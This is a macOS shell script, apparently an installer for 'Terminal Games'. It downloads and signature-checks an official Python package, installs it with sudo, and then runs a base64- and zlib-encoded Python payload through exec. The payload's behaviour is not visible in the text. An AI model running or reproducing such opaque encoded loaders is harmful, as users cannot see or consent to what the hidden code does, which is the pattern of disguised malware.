#!/bin/sh
set -eu
app_dir=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
fail() { printf '%s\n' "$1" 'Press Enter to close.'; read -r answer; exit 1; }
python_bin=''
for candidate in /Library/Frameworks/Python.framework/Versions/3.13/bin/python3 /opt/homebrew/bin/python3 /usr/local/bin/python3 python3; do
    if "$candidate" -c 'import sys; assert sys.version_info >= (3,9)' >/dev/null 2>&1; then python_bin="$candidate"; break; fi
done
if [ -z "$python_bin" ]; then
    printf '%s\n' 'Python is missing. Downloading the official Python installer...' 'macOS may ask for your administrator password to install Python.'
    download_dir=$(mktemp -d "${TMPDIR:-/tmp}/terminal-games.XXXXXX")
    trap 'rm -rf "$download_dir"' EXIT HUP INT TERM
    pkg="$download_dir/python.pkg"
    curl --fail --location --proto '=https' --tlsv1.2 --connect-timeout 20 --max-time 600 'https://www.python.org/ftp/python/3.13.17/python-3.13.17-macos11.pkg' -o "$pkg" || fail 'Python download failed. Check your connection and run START HERE again.'
    pkgutil --check-signature "$pkg" > "$download_dir/signature.txt" || fail 'Python installer signature check failed.'
    grep -q 'Python Software Foundation' "$download_dir/signature.txt" || fail 'Unexpected installer publisher.'
    sudo /usr/sbin/installer -pkg "$pkg" -target / || fail 'Installation was cancelled or failed. Run START HERE again to retry.'
    python_bin=/Library/Frameworks/Python.framework/Versions/3.13/bin/python3
    if [ -f '/Applications/Python 3.13/Install Certificates.command' ]; then
        sh '/Applications/Python 3.13/Install Certificates.command' || fail 'Certificate setup failed. Check your connection and run Install Certificates.command in Applications/Python 3.13.'
    fi
fi
"$python_bin" -c 'import sys; assert sys.version_info >= (3,9)' || fail 'Python installation could not be verified.'
export PATH="$(dirname -- "$python_bin"):$PATH"
"$python_bin" -c "import base64,zlib;exec(compile(zlib.decompress(base64.b64decode('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')),'<Terminal Games installer>','exec'))" || fail 'Install or launch failed. Run this installer again to retry.'
